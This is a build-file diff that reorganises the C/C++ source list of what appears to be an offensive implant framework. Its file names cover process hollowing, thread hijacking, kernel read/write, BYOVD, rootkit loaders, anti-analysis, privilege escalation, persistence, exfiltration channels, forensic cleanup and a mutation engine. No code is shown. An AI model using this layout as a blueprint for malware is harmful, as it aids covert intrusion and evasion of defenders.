@@ -35,17 +35,28 @@ set(RUNTIME_SOURCES
     byovd/driver_scoring.c
     byovd/byovd_manifest.c
     byovd/byovd_modular.c
-    linux/syscall.c
-    linux/sysinfo_syscall.c
-    linux/process_syscall.c
-    linux/env_syscall.c
-    linux/file_syscall.c
-    linux/dir_syscall.c
-    linux/mem_syscall.c
-    linux/signal_syscall.c
-    linux/process_control_syscall.c
-    linux/ipc_syscall.c
-    linux/util_syscall.c
+
+    # Linux syscall wrappers (FIXED PATHS: linux/syscalls/ not linux/)
+    linux/syscalls/syscall.c
+    linux/syscalls/sysinfo_syscall.c
+    linux/syscalls/env_syscall.c
+    linux/syscalls/file_syscall.c
+    linux/syscalls/dir_syscall.c
+    linux/syscalls/mem_syscall.c
+    linux/syscalls/signal_syscall.c
+    linux/syscalls/ipc_syscall.c
+    linux/syscalls/util_syscall.c
+
+    # Linux process operations
+    linux/process/process_syscall.c
+    linux/process/process_control_syscall.c
+    linux/process/hollow.c
+    linux/process/process_hollow.c
+    linux/process/advanced_process_ops.c
+    linux/process/ptrace_control.c
+    linux/process/thread_hijack.c
+
+    # Linux kernel operations
     linux/kernel/lkm_loader.c
     linux/kernel/lkm_loader.cpp
     linux/kernel/ebpf_loader.c
@@ -55,16 +66,86 @@ set(RUNTIME_SOURCES
     linux/kernel/modules.c
     linux/kernel/advanced_syscalls.c
     linux/kernel/advanced_kernel_ops.c
+    linux/kernel/module_loader.c
+    linux/kernel/module_ops.c
+    linux/kernel/kread_kwrite.c
+    linux/kernel/byovd_ops.c
+
+    # Linux anti-analysis
     linux/anti_analysis/artifact_hiding.cpp
     linux/anti_analysis/userland_evasion.cpp
+    linux/anti_analysis/anti_analysis.c
+    linux/anti_analysis/detection.c
+
+    # Linux privilege escalation
     linux/lpe/privilege_escalation.cpp
     linux/lpe/fence2pwn.c
-    linux/process/hollow.c
-    linux/process/process_syscall.c
-    linux/process/process_control_syscall.c
-    linux/process/advanced_process_ops.c
+
+    # Linux core operations
+    linux/core/audit_ops.c
+    linux/core/runtime_init.c
+    linux/core/sandbox_ops.c
+
+    # Linux persistence
+    linux/persistence.c
+    linux/persistence/cron_systemd.c
+
+    # Linux exfiltration
+    linux/exfil/exfil_channels.c
+
+    # Linux I/O
+    linux/io/io_core.c
+
+    # Linux threading
+    linux/threading/threadpool.c
+
+    # Linux networking
     linux/networking/network.c
+
+    # Linux forensics
     linux/forensics/linux_forensics.c
+    linux/forensics/cleanup.c
+
+    # Linux missing APIs
+    linux/missing_apis.c
+
+    # Forensic analysis pipeline (Kamimi)
+    forensics/forensic_engine.c
+    forensics/forensics_rt.c
+    forensics/forensic_utils.c
+    forensics/jocky_forensics_rt_v2.c
+    forensics/audit/audit_log.c
+    forensics/control/capabilities.c
+    forensics/engine/analysis.c
+    forensics/engine/provenance.c
+    forensics/plugins/collectors/evtx_collector.c
+    forensics/plugins/collectors/file_collector.c
+    forensics/plugins/collectors/memory_collector.c
+    forensics/plugins/collectors/mft_collector.c
+    forensics/plugins/collectors/network_collector.c
+    forensics/plugins/collectors/prefetch_collector.c
+    forensics/plugins/collectors/process_collector.c
+    forensics/plugins/collectors/registry_collector.c
+    forensics/plugins/collectors/usnjrnl_collector.c
+    forensics/plugins/output/html_output.c
+    forensics/plugins/output/json_output.c
+    forensics/plugins/output/siem_forwarder.c
+    forensics/plugins/output/sigma_output.c
+    forensics/plugins/output/stix_output.c
+    forensics/plugins/parsers/arp_parser.c
+    forensics/plugins/parsers/dns_parser.c
+    forensics/plugins/parsers/elf_parser.c
+    forensics/plugins/parsers/evtx_parser.c
+    forensics/plugins/parsers/file_parser.c
+    forensics/plugins/parsers/memory_parser.c
+    forensics/plugins/parsers/mft_parser.c
+    forensics/plugins/parsers/network_parser.c
+    forensics/plugins/parsers/prefetch_parser.c
+    forensics/plugins/parsers/process_parser.c
+    forensics/plugins/parsers/registry_parser.c
+    forensics/store/evidence_store.c
+
+    # AI
     ai/mutation_engine.c
 )
 
